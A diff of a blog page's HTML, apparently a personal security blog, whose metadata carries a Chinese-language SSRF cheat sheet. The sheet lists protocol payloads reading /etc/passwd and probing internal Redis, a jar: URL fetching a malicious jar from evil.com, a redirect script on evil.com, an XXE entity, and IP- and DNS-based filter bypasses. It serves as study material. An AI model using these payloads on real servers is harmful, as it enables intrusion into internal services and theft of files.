@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="dark">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
-<title>SSRF | Cybersecurity learning</title>
+<meta name="robots" content="index, follow">
+<title>SSRF | h4xk0r blog</title>
 <meta name="keywords" content="">
 <meta name="description" content="伪协议
 PHP
@@ -57,16 +57,16 @@ IPv6 绕过：
 使用 IPv6 格式的内网地址。
 利用DNS">
 <meta name="author" content="h4xk0r">
-<link rel="canonical" href="http://localhost:1313/posts/ssrf/">
+<link rel="canonical" href="https://b1ckdoor.com/posts/ssrf/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.a72a21d173e6574a7d787ef864b8ff56506981bd547deea0fbd1766f099539cc.css" integrity="sha256-pyoh0XPmV0p9eH74ZLj/VlBpgb1Ufe6g&#43;9F2bwmVOcw=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://b1ckdoor.com/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://b1ckdoor.com/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://b1ckdoor.com/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://b1ckdoor.com/apple-touch-icon.png">
+<link rel="mask-icon" href="https://b1ckdoor.com/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/ssrf/">
+<link rel="alternate" hreflang="en" href="https://b1ckdoor.com/posts/ssrf/">
 <noscript>
     <style>
         #theme-toggle,
@@ -81,13 +81,136 @@ IPv6 绕过：
         document.querySelector("html").dataset.theme = 'light';
     }
 
+</script><meta property="og:url" content="https://b1ckdoor.com/posts/ssrf/">
+  <meta property="og:site_name" content="h4xk0r blog">
+  <meta property="og:title" content="SSRF">
+  <meta property="og:description" content="伪协议 PHP http/s:// 常用于探测存活主机和开放端口,配合burp
+https://example.com/title?title=http://127.0.0.1:6379 file:// 读取文件内容
+file:///etc/passwd dict:// 字典服务协议，可以通过这个协议执行一些指令.但是dict很难完成复杂的认证，他每次发送的请求都是新建立的连接
+dict://127.0.0.1:6379/info gopher:// gopher协议可以伪造任何基于TCP的应用层协议报文（java不支持）
+gopher://&lt;host&gt;:&lt;port&gt;/_&lt;payload&gt; _ : 占位符。gopher协议在传输中会吃掉路径后的第一个字符 &lt;payload&gt; : 经过URL编码的原始tcp数据流 JAVA file:// 协议	与 PHP 类似
+可以读取本地文件：file:///etc/passwd。
+netdoc:// 协议	它允许你访问并提取 jar 包中的内容。
+Payload: netdoc:///etc/passwd jar:// 协议	它允许你访问并提取 jar 包中的内容。
+语法： jar:{url}!/{entry} 用法： jar:http://evil.com/test.jar!/com/test/Main.class 利用点： 让服务器去下载远程恶意 jar 包。 读取本地 classpath 下的配置文件。 结合某些反序列化漏洞，控制类加载过程。 绕过 IP地址
+进制转换： 浏览器和许多网络库支持非十进制的 IP。 八进制： 0177.0.0.1 十六进制： 0x7f.0x0.0x0.0x1 十进制整数（最隐蔽）： 将 IP 换算成一个超大数字。127.0.0.1 ----&gt; 2130706433 特殊省略写法： 127.0.0.1 可以写成 127.1 或 127.0.1。 0.0.0.0 在 Linux 下通常也会指向本地。 IPv6 绕过： 使用 [::1] 代表 127.0.0.1。 使用 IPv6 格式的内网地址。 利用DNS">
+  <meta property="og:locale" content="zh-cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-02-15T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-02-15T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSRF">
+<meta name="twitter:description" content="伪协议
+PHP
+http/s://  常用于探测存活主机和开放端口,配合burp
+https://example.com/title?title=http://127.0.0.1:6379
+file://  读取文件内容
+file:///etc/passwd
+dict://  字典服务协议，可以通过这个协议执行一些指令.但是dict很难完成复杂的认证，他每次发送的请求都是新建立的连接
+dict://127.0.0.1:6379/info
+gopher://  gopher协议可以伪造任何基于TCP的应用层协议报文（java不支持）
+gopher://&lt;host&gt;:&lt;port&gt;/_&lt;payload&gt;
+
+_ : 占位符。gopher协议在传输中会吃掉路径后的第一个字符
+&lt;payload&gt; : 经过URL编码的原始tcp数据流
+JAVA
+file:// 协议	与 PHP 类似
+可以读取本地文件：file:///etc/passwd。
+netdoc:// 协议	它允许你访问并提取 jar 包中的内容。
+
+Payload: netdoc:///etc/passwd
+
+jar:// 协议	它允许你访问并提取 jar 包中的内容。
+
+语法： jar:{url}!/{entry}
+用法： jar:http://evil.com/test.jar!/com/test/Main.class
+利用点：
+
+让服务器去下载远程恶意 jar 包。
+读取本地 classpath 下的配置文件。
+结合某些反序列化漏洞，控制类加载过程。
+
+
+
+绕过
+IP地址
+进制转换： 浏览器和许多网络库支持非十进制的 IP。
+
+八进制： 0177.0.0.1
+十六进制： 0x7f.0x0.0x0.0x1
+十进制整数（最隐蔽）： 将 IP 换算成一个超大数字。127.0.0.1 ----&gt; 2130706433
+
+特殊省略写法：
+
+127.0.0.1 可以写成 127.1 或 127.0.1。
+0.0.0.0 在 Linux 下通常也会指向本地。
+
+IPv6 绕过：
+使用 [::1] 代表 127.0.0.1。
+使用 IPv6 格式的内网地址。
+利用DNS">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://b1ckdoor.com/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "SSRF",
+      "item": "https://b1ckdoor.com/posts/ssrf/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SSRF",
+  "name": "SSRF",
+  "description": "伪协议 PHP http/s:// 常用于探测存活主机和开放端口,配合burp\nhttps://example.com/title?title=http://127.0.0.1:6379 file:// 读取文件内容\nfile:///etc/passwd dict:// 字典服务协议，可以通过这个协议执行一些指令.但是dict很难完成复杂的认证，他每次发送的请求都是新建立的连接\ndict://127.0.0.1:6379/info gopher:// gopher协议可以伪造任何基于TCP的应用层协议报文（java不支持）\ngopher://\u0026lt;host\u0026gt;:\u0026lt;port\u0026gt;/_\u0026lt;payload\u0026gt; _ : 占位符。gopher协议在传输中会吃掉路径后的第一个字符 \u0026lt;payload\u0026gt; : 经过URL编码的原始tcp数据流 JAVA file:// 协议\t与 PHP 类似\n可以读取本地文件：file:///etc/passwd。\nnetdoc:// 协议\t它允许你访问并提取 jar 包中的内容。\nPayload: netdoc:///etc/passwd jar:// 协议\t它允许你访问并提取 jar 包中的内容。\n语法： jar:{url}!/{entry} 用法： jar:http://evil.com/test.jar!/com/test/Main.class 利用点： 让服务器去下载远程恶意 jar 包。 读取本地 classpath 下的配置文件。 结合某些反序列化漏洞，控制类加载过程。 绕过 IP地址\n进制转换： 浏览器和许多网络库支持非十进制的 IP。 八进制： 0177.0.0.1 十六进制： 0x7f.0x0.0x0.0x1 十进制整数（最隐蔽）： 将 IP 换算成一个超大数字。127.0.0.1 ----\u0026gt; 2130706433 特殊省略写法： 127.0.0.1 可以写成 127.1 或 127.0.1。 0.0.0.0 在 Linux 下通常也会指向本地。 IPv6 绕过： 使用 [::1] 代表 127.0.0.1。 使用 IPv6 格式的内网地址。 利用DNS\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "伪协议 PHP http/s:// 常用于探测存活主机和开放端口,配合burp\nhttps://example.com/title?title=http://127.0.0.1:6379 file:// 读取文件内容\nfile:///etc/passwd dict:// 字典服务协议，可以通过这个协议执行一些指令.但是dict很难完成复杂的认证，他每次发送的请求都是新建立的连接\ndict://127.0.0.1:6379/info gopher:// gopher协议可以伪造任何基于TCP的应用层协议报文（java不支持）\ngopher://:/_ _ : 占位符。gopher协议在传输中会吃掉路径后的第一个字符 : 经过URL编码的原始tcp数据流 JAVA file:// 协议\t与 PHP 类似\n可以读取本地文件：file:///etc/passwd。\nnetdoc:// 协议\t它允许你访问并提取 jar 包中的内容。\nPayload: netdoc:///etc/passwd jar:// 协议\t它允许你访问并提取 jar 包中的内容。\n语法： jar:{url}!/{entry} 用法： jar:http://evil.com/test.jar!/com/test/Main.class 利用点： 让服务器去下载远程恶意 jar 包。 读取本地 classpath 下的配置文件。 结合某些反序列化漏洞，控制类加载过程。 绕过 IP地址\n进制转换： 浏览器和许多网络库支持非十进制的 IP。 八进制： 0177.0.0.1 十六进制： 0x7f.0x0.0x0.0x1 十进制整数（最隐蔽）： 将 IP 换算成一个超大数字。127.0.0.1 ----\u003e 2130706433 特殊省略写法： 127.0.0.1 可以写成 127.1 或 127.0.1。 0.0.0.0 在 Linux 下通常也会指向本地。 IPv6 绕过： 使用 [::1] 代表 127.0.0.1。 使用 IPv6 格式的内网地址。 利用DNS\n如果后端校验了域名解析后的IP，但是校验逻辑存在疏忽依然可以利用\n域名映射\n利用一些指向127.0.0.1的公网域名\nlocaltest.me customer-127-0-0-1.nimbus.no 127.0.0.1.nip.io DNS 重绑定\n原理： 控制一个dns服务器，设置极短的TTL ，第一次解析： 校验代码询问DNS，返回一个合法的外网IP，校验通过。 第二次解析：\n实际发起请求的代码再次询问DNS，由于TTL已经过期进行重新请求，这次返回127.0.0.1\nURL解析差异\n不同的编程语言或者库对url的解析规则不同\n@符号绕过：`http://www.google.com@127.0.0.1` 有些解析器认为访问的是 `google.com`。 有些（如 `curl`）则认为 `@` 前面是用户名密码，实际请求的是 `127.0.0.1`。 斜杠与反斜杠： http://expected.com\\@127.0.0.1 # 锚点绕过： http://127.0.0.1#www.google.com 利用重定向\n如果后端只检查初始输入的 URL 协议和域名，但不检查后续的跳转。\n你在自己的服务器 evil.com 上放一个脚本： \u003c?php header(\"Location: dict://127.0.0.1:6379\"); ?\u003e 输入 URL：http://evil.com/redirect.php\n服务器访问你的脚本，收到 302 跳转，于是顺着去请求了内网的 Redis。\njava的ssrf一般跟xxe有关\n用户上传 XML -\u003e Java XML 解析器未禁用外部实体 -\u003e 攻击者定义一个外部实体指向内网地址 -\u003e 解析器去请求该地址。\n\u003c!DOCTYPE test [ \u003c!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/config\"\u003e ]\u003e \u0026xxe; 漏洞的挖掘 图片,文章收藏功能： 此处的图片，文章收藏中的文章就类似于分析功能中获取URL地址中的title以及文本的内容作为显示\n例如：title是文章的地址，收藏后访问地址变成\nhttps://example.com/title?title=http://title.com/askdf123 google语法关键字：\nshare\twap url\tlink src source target u display sourceURl imageURL domain 代码审计（php）\nphp产⽣ssrf的三个函数\ncurl_exec(): fsockopen(): file_get_contents: 这三个函数有⼀个共同点就是，都可以向⼀个⽹址或者站点发起⼀个请求\n",
+  "wordCount" : "176",
+  "inLanguage": "en",
+  "datePublished": "2026-02-15T00:00:00Z",
+  "dateModified": "2026-02-15T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "h4xk0r"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://b1ckdoor.com/posts/ssrf/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "h4xk0r blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://b1ckdoor.com/favicon.ico"
+    }
+  }
+}
 </script>
 </head>
 <body id="top">
     <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="Cybersecurity learning (Alt + H)">Cybersecurity learning</a>
+            <a href="https://b1ckdoor.com/" accesskey="h" title="h4xk0r blog (Alt + H)">h4xk0r blog</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -113,22 +236,22 @@ IPv6 绕过：
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/posts/" title="档案">
+                <a href="https://b1ckdoor.com/posts/" title="档案">
                     <span>档案</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/search/" title="搜索 (Alt &#43; /)" accesskey=/>
+                <a href="https://b1ckdoor.com/search/" title="搜索 (Alt &#43; /)" accesskey=/>
                     <span>搜索</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/categories/" title="分类">
+                <a href="https://b1ckdoor.com/categories/" title="分类">
                     <span>分类</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/fuzzlist/" title="Fuzzlist">
+                <a href="https://b1ckdoor.com/fuzzlist/" title="Fuzzlist">
                     <span>Fuzzlist</span>
                 </a>
             </li>
@@ -310,12 +433,26 @@ file_get_contents:
   <footer class="post-footer">
     <ul class="post-tags">
     </ul>
-  </footer>
+  </footer><script src="https://giscus.app/client.js"
+        data-repo="h4xk0r/h4xk0r.github.io"
+        data-repo-id="R_kgDORE9_Hw"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORE9_H84C9ILE"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+</script>
 </article>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:1313/">Cybersecurity learning</a></span> · 
+        <span>&copy; 2026 <a href="https://b1ckdoor.com/">h4xk0r blog</a></span> · 
 
     <span>
         Powered by
